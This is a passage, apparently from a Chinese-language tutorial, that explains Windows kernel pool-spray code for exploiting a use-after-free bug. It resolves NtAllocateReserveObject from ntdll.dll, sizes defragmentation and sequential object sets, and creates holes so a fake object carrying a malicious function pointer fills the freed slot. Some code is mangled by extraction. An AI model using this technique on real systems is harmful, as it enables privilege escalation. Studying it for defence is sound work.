IN POBJECT_ATTRIBUTES ObjectAttributes,  
IN DWORD ObjectType);
//定义了一个名为 _NtAllocateReserveObject 的函数指针, 这个指针指向 NtAllocateReserveObject
函数，并且可以用于在代码中调用该函数, 让我们看看这个函数的参数：
//hObject：一个输出参数，用于存储分配的内存对象的句柄  
//ObjectAttributes：一个指向 OBJECT_ATTRIBUTES 结构的指针，用于指定对象的属性  
//ObjectType：一个整数，用于指定要分配的对象类型。
//这段代码的作用是定义了一个函数指针，指向了 NtAllocateReserveObject 函数，这个函数可以用于分配内存对象，参数 hObject
存储分配的对象的句柄，ObjectAttributes 指定对象的属性，ObjectType 指定分配的对象类型。
我们可以这样获取函数 NtAllocateReserveObject 的地址：
  1. 使用 GetModuleHandleA 函数来获取 ntdll.dll 这个动态链接库的句柄
  2. 使用 GetProcAddress 函数来获取 NtAllocateReserveObject 函数的地址
  3. 将该地址强制转换为 _NtAllocateReserveObject 类型的函数指针，并将它存储在变量 NtAllocateReserveObject 中
这样，代码就可以通过调用 NtAllocateReserveObject 变量来调用 NtAllocateReserveObject 函数，而不需要每次调用
GetProcAddress 函数。
_NtAllocateReserveObject NtAllocateReserveObject =  
(_NtAllocateReserveObject)(GetProcAddress(GetModuleHandleA("ntdll.dll"),
"NtAllocateReserveObject"));
整个过程大概是这样：
非分页池堆喷  
|  
|-- UAF对象  
| |-- 替换函数指针  
|  
|-- 非分页池  
| |-- 准备内存布局  
|  
|-- 堆喷技术  
| |-- 创建0x58大小的内存块  
| |-- 填充非分页池  
| |-- 通过释放一些对象创建空闲块  
|  
|-- UAF对象分配  
| |-- 填充释放对象后打开的空闲块  
|  
|-- UAF对象释放  
| |-- 用伪造对象填充空闲块  
| |-- 恶意载荷(payload)  
|  
|-- 合适大小的内存块  
| |-- IoReserveObject (0x60大小)  
| |-- NtAllocateReserveObject函数  
| |-- 对象类型ID 1  
|  
|-- NtAllocateReserve函数  
| |-- 没有Windows API函数  
| |-- 从ntdll.dll获取地址  
| |-- GetModuleHandle函数  
| |-- GetProcAddress函数  
|  
|-- 转换地址  
| |-- NtAllocateReserveObject的函数指针  
| |-- 设置定义
继续看代码，
std::pairstd::vector> spray_pool(int objects_n){  
//定义了一个名为 spray_pool 的函数，它接受一个整数参数 objects_n，并返回一个 std::pair 类型的对象;  
//std::pair 对象包含两个 std::vector 类型的向量, 这两个向量分别存储分配的堆碎片整理对象（defrag
objects）和连续对象（sequential objects）的句柄。
    int defrag_n = 0.25 * objects_n;
    int seq_n = objects_n - defrag_n;
    //这两行代码是用来计算两个整数值 defrag_n 和 seq_n，它们分别表示在内存池中进行碎片整理所需对象的数量以及顺序分配对象的数量:
    //int defrag_n = 0.25 * objects_n;：这一行代码将 objects_n（传递给 spray_pool 函数的整数参数）乘以 0.25，得到需要用于内存碎片整理的对象数量。这意味着我们将使用总对象数量的四分之一来进行碎片整理, 将计算结果赋值给 defrag_n 变量。注意：虽然我们将 objects_n 乘以一个浮点数（0.25），但由于 defrag_n 是一个整数，因此结果将被截断为整数。
    //int seq_n = objects_n - defrag_n;：这一行代码通过将总对象数量 objects_n 减去用于碎片整理的对象数量 defrag_n，来计算用于顺序分配的对象数量。将计算结果赋值给 seq_n 变量。通过这两个值，我们可以将总对象数量分为两部分：一部分用于整理内存碎片（defrag_n），另一部分用于顺序分配（seq_n）,在接下来的代码中，我们将根据这两个值来分配和处理内存对象。
    /***
    这两行代码的目的是将内存池喷洒任务划分为两个部分：内存碎片整理和顺序分配, 这种划分是为了提高利用UAF（Use-After-Free）漏洞的成功率。
    内存碎片整理（defrag_n）：这部分的目标是在内存池中创建连续的空闲空间, 通过分配一些对象（在这里是总对象数量的四分之一）并稍后释放它们，我们可以使内存池中的空闲空间变得更加连续, 这有助于提高我们接下来的顺序分配操作的成功率，因为它使得分配的对象更可能在内存中紧密相邻。
    顺序分配（seq_n）：在内存碎片整理之后，我们会执行顺序分配, 顺序分配意味着我们将分配一系列的对象，这些对象在内存中是紧密相邻的。通过这种方式，我们提高了UAF对象在释放后被我们所控制的假对象覆盖的可能性, 当我们成功地覆盖了UAF对象，我们就可以在其中插入恶意的函数指针，从而利用UAF漏洞。
    所以说这两行代码通过计算defrag_n和seq_n的值，将喷洒任务划分为两个部分，以提高利用UAF漏洞的成功率;这里选择使用四分之一的对象进行碎片整理是一种启发式策略，可以根据实际情况进行调整。
    ***/
    // 输出分配的堆碎片整理对象和连续对象的数量
    std::cout  defrag_handles;
    std::vector seq_handles;
    // 从 ntdll.dll 获取 NtAllocateReserveObject 函数的地址
    _NtAllocateReserveObject NtAllocateReserveObject = 
        (_NtAllocateReserveObject)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateReserveObject"));
    // 如果无法获取 NtAllocateReserveObject 函数，退出程序
    if (!NtAllocateReserveObject){
        std::cout > handles =
spray_pool(poolAllocs);  
//调用了函数 spray_pool，并将返回的结果保存到了 handles 中; 前面学过spray_pool 函数是用于分配内存对象的，它返回了两个
std::vector 向量，分别保存了顺序分配和碎片整理所分配的对象句柄
std::cout << "Creating " << handles.second.size() << " holes\n";
//输出提示信息：表示要在内存池中创建“空闲块”  